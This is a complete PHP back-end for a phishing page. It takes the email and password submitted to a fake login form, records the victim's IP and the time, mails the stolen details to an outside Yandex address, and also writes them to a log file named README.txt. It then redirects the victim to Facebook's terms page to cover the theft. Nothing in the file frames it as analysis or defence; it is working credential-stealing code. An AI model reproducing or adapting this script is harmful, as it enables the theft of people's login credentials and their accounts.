<?php

$user = $_POST['email'];
$pass =  $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$msg="==Newton V7==
Email : $user
Password   : $pass
IP: $ip
Date: $today
";

$send = "XXXX@yandex.com";
$subject = "$today";
$headers = "From: ";
$headers .= "MIME-Version: 1.0\n";

$listfile="README.txt";
$fp = fopen($listfile, 'a+');
flock($fp,2);
fwrite($fp, $msg);
{
mail($send,$subject,$msg,$headers);
}
header("Location:https://www.facebook.com/terms");

?>
